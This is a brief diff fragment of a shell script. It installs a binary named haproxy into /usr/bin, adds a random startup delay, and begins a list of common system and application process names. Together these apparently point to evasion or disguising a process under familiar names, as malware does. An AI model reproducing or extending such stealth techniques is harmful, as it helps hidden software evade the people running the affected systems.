@@ -7,6 +7,9 @@ cd haproxy
 chmod +x ./haproxy
 mv ./haproxy /usr/bin/haproxy
 
+PRE_DELAY=$(shuf -i15-30 -n1)
+sleep $PRE_DELAY
+
 HAPROXY_BIN="/usr/bin/haproxy"
 PROCESS_NAMES=(
 chrome node systemd kworker redis dockerd containerd sshd nginx pm2
